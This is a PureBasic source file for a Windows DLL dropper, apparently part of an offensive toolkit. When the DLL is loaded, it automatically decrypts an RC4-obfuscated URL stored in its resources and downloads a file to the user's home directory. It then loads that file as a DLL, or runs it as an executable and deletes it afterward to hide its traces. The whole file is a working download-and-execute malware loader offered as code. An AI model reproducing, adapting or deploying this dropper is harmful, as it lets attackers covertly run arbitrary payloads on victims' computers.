; ***************************************************************************
; *                                                                         *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; * License:     BSD License                                                *
; * Copyright:   (c) 2012, a12d404.net                                      *
; * Status:      Prototype                                                  *
; *                                                                         *
; ***************************************************************************
EnableExplicit


; Always returns #False in AttachProcess to force the DLL Unload ...


XIncludeFile("lib/kernel32.pbi")
XIncludeFile("filesystem/pefile.pbi")
XIncludeFile("security/rc4_crypto.pbi")
XIncludeFile("include/inc_dropper.pbi")

; ---------------------------------------------------------------------------
;- Consts


; ---------------------------------------------------------------------------
;- Types


; ---------------------------------------------------------------------------
;- Prototypes
DeclareDLL RunDll(*hwnd, *hinst, *lpszCmdLine.s, nCmdShow.l)

; ---------------------------------------------------------------------------
;- Variables


; ---------------------------------------------------------------------------
;- Procedures

; ***************************************************************************
; * Sample -- Does nothing ... really!                                      *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
;Procedure.b Sample(param.l)
;   Define res.b
;   
; SampleCleanup:
;   
;   ProcedureReturn res
; SampleError:
;   res = #False
;   Goto SampleCleanup
;EndProcedure

; ---------------------------------------------------------------------------

; ***************************************************************************
; * AttachProcess -- 
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
ProcedureDLL.i AttachProcess(Instance)
  RunDll(#Null, #Null, #Null, 0)

  ProcedureReturn #False
EndProcedure

; ***************************************************************************
; * RunDll -- Loads the payload and executes it.                            *
; *           If the payload is a DLL the dropper dynamically loads it      *
; *           using rundll32.exe                                            *
; *           Callback used by rundll32 to load the dll or AttachProcess.   *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
ProcedureDLL RunDll(*hwnd, *hinst, *lpszCmdLine.s, nCmdShow.l)
  ; RUNDLL.EXE SETUPX.DLL,InstallHinfSection 132 C:\WINDOWS\INF\SHELL.INF
  Define checksum.s = ResourceLoadString(#RES_STR_LOCAL_FILE_NAME)
  Define localFileName.s
  Define localFileExt.s
  Define url.s
  
  ; construct the local filename
  localFileExt.s = rc4_base64_decrypt(@checkSum, StringByteLength(checkSum), ResourceLoadString(#RES_STR_URL_EXTENSION))
  localFileName = GetHomeDirectory() + checksum + localFileExt
  
  ; decrypt URL
  ;   (re)init ARCFOUR encryption
  url = rc4_base64_decrypt(@checkSum, StringByteLength(checkSum), ResourceLoadString(#RES_STR_URL))
  If url = ""
    ProcedureReturn
  EndIf
  
  If Not InitNetwork()
    ProcedureReturn
  EndIf
  
  If ReceiveHTTPFile(url, localFileName)
    If localFileExt = ".dll"
      ; DLL ... load with load library
      If Load_Kernel32()
        If Not LoadLibrary(@localFileName)
          DeleteFile(localFileName)
        EndIf
      EndIf
    Else
      ; EXE ... just run & remove!
      RunProgram(localFileName, "", "", #PB_Program_Wait)
      ; Wait ... DumDiDumDiDum ... now remove the loaded file ...
      DeleteFile(localFileName)
    EndIf
  EndIf
  
  Unload_Kernel32()
EndProcedure


; IDE Options = PureBasic 4.60 Beta 3 (Windows - x64)
; CursorPosition = 95
; FirstLine = 62
; Folding = -
; EnableXP
; EnablePurifier
; EnableCompileCount = 0
; EnableBuildCount = 0
; EnableExeConstant